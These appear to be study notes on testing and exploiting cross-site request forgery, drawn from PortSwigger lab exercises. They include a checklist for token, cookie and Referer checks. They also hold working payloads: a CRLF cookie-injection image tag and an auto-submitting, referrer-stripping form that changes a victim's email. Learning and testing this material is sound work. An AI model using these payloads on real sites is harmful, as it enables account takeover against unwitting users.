For a CSRF attack to be possible, three key conditions must be in place:
```
1. A relevant action.
2. Cookie-based session handling.
3. No unpredictable request parameters.
```
### Testing CSRF Token.
```
1. Remove CSRF parameter/token and see if application accepts it.
2. Change request method POST to GET.
3. Exchange csrf token with another user.
```
### Testing CSRF token and CSRF Cookies.
____
#### Check if CSRF token is tied to the CSRF cookie.
```
1. Submit an invalid CSRF token.
2. Submit a valid CSRF token from another user.
3. Submit a valid CSRF token and CSRF cookie from another user.
4. In uplicated token cookie try to assign same random value in token+cookie.
```
### Exploitation
To exploit this CSRF token+cookie mechanism, we need to perform 2 things.
```
1. Inject a CSRF cookie in user's session. (HTTP Header injection)
2. Send a CSRF attack to victim.
```
#### Exploit
```html
<img src="https://0a5000e9036c9fa3820d15c300a500d4.web-security-academy.net/?search=asdasfa%0d%0aSet-Cookie:%20csrf=testing;%20SameSite=None" onerror="document.forms[0].submit()">
```
### Testing Referer Header for CSRF attack
```
1. Remove Refere Header and see if it works.
2. Check which portion of referrer header is the application validating.
Ex >> Referer:  https://attacker.com/?vulnerable-web.net
                http://vulnerable-website.com.attacker-website.com/csrf-attack
```
#### Exploit for case 1
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<head>
<meta name="referrer" content="no-referrer">
</head>
  <body>
    <form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
### SameSite Lax Bypass
```
1. Change method POST to GET.
2. Via cookie refresh
```
